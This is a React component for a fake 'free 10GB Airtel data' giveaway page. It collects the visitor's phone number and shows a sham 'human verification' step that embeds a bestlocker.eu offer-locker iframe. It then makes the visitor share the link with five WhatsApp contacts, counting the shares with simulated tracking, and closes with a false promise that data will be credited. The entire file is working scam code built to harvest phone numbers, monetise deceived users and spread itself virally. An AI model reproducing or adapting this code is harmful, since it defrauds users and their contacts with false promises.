"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import { Loader2, ShieldCheck, Share2, CheckCircle2 } from "lucide-react"
import type { VerificationStep, ShareProgress } from "./types"
import { ShareProgressIndicator } from "./share-progress"

export function VerificationForm() {
  const [step, setStep] = useState<VerificationStep>("phone")
  const [isLoading, setIsLoading] = useState(false)
  const [phone, setPhone] = useState("")
  const [shareProgress, setShareProgress] = useState<ShareProgress>({
    total: 0,
    required: 5,
  })

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    await new Promise((resolve) => setTimeout(resolve, 1500))

    if (step === "phone") {
      setStep("human")
    } else if (step === "human") {
      setStep("share")
    }

    setIsLoading(false)
  }

  const handleWhatsAppShare = async () => {
    try {
      const shareText = `🎁 Hey! I just got 10GB free Airtel data! You can get it too!\n\n${window.location.href}`

      // Mobile WhatsApp sharing
      if (/Android|iPhone/i.test(navigator.userAgent)) {
        window.location.href = `whatsapp://send?text=${encodeURIComponent(shareText)}`
      }
      // Desktop WhatsApp sharing
      else {
        window.open(`https://web.whatsapp.com/send?text=${encodeURIComponent(shareText)}`, "_blank")
      }

      // Simulate share tracking
      await new Promise((resolve) => setTimeout(resolve, 1000))
      setShareProgress((prev) => ({
        ...prev,
        total: Math.min(prev.total + 1, prev.required),
      }))

      // Check if sharing requirement is met
      if (shareProgress.total + 1 >= shareProgress.required) {
        setStep("final")
      }
    } catch (error) {
      console.error("Error sharing:", error)
    }
  }

  return (
    <Card className="max-w-[min(100%,24rem)] mx-auto p-4 sm:p-6 shadow-lg">
      <form onSubmit={handleSubmit} className="space-y-4">
        {step === "phone" && (
          <div className="space-y-2">
            <label htmlFor="phone" className="text-sm font-medium">
              Phone Number
            </label>
            <Input
              id="phone"
              type="tel"
              placeholder="Enter your Airtel number"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              required
              pattern="[0-9]{10}"
              className="w-full text-base sm:text-lg p-6"
            />
            <p className="text-xs text-gray-500">Enter 10-digit Airtel number</p>
          </div>
        )}

        {step === "human" && (
          <div className="space-y-4 text-center py-4">
            <ShieldCheck className="w-12 h-12 sm:w-16 sm:h-16 mx-auto text-red-600" />
            <h3 className="font-semibold text-lg sm:text-xl">Human Verification Required</h3>
            <p className="text-sm sm:text-base text-gray-600">Please complete a quick verification to continue</p>
            <div className="mt-6">
              <iframe
                src="https://bestlocker.eu/iframe/10ab95b2-f105-11ef-8fbe-8a5fb7be40ea?allow_translate=1"
                className="w-full min-h-[400px] border-0"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowFullScreen
              />
            </div>
          </div>
        )}

        {step === "share" && (
          <div className="space-y-6 py-4">
            <div className="text-center space-y-4">
              <Share2 className="w-12 h-12 sm:w-16 sm:h-16 mx-auto text-red-600" />
              <h3 className="font-semibold text-lg sm:text-xl">Share to Claim</h3>
              <p className="text-sm sm:text-base text-gray-600">
                Share this offer with 5 WhatsApp contacts to get your free data
              </p>
            </div>

            <ShareProgressIndicator progress={shareProgress} />

            <Button
              type="button"
              onClick={handleWhatsAppShare}
              className="w-full bg-green-600 hover:bg-green-700 text-white p-6 text-base sm:text-lg flex items-center justify-center gap-2"
            >
              Share on WhatsApp
            </Button>
          </div>
        )}

        {step === "final" && (
          <div className="space-y-6 py-4 text-center">
            <CheckCircle2 className="w-16 h-16 mx-auto text-green-600" />
            <div className="space-y-2">
              <h3 className="font-semibold text-xl">Congratulations!</h3>
              <p className="text-gray-600">Your 10GB data will be credited to {phone} within 24 hours</p>
            </div>
          </div>
        )}

        {step === "phone" && (
          <Button
            type="submit"
            className="w-full bg-red-600 hover:bg-red-700 text-white p-6 text-base sm:text-lg"
            disabled={isLoading}
          >
            {isLoading ? (
              <>
                <Loader2 className="w-4 h-4 sm:w-5 sm:h-5 animate-spin mr-2" />
                Processing...
              </>
            ) : (
              "Continue"
            )}
          </Button>
        )}
      </form>
    </Card>
  )
}

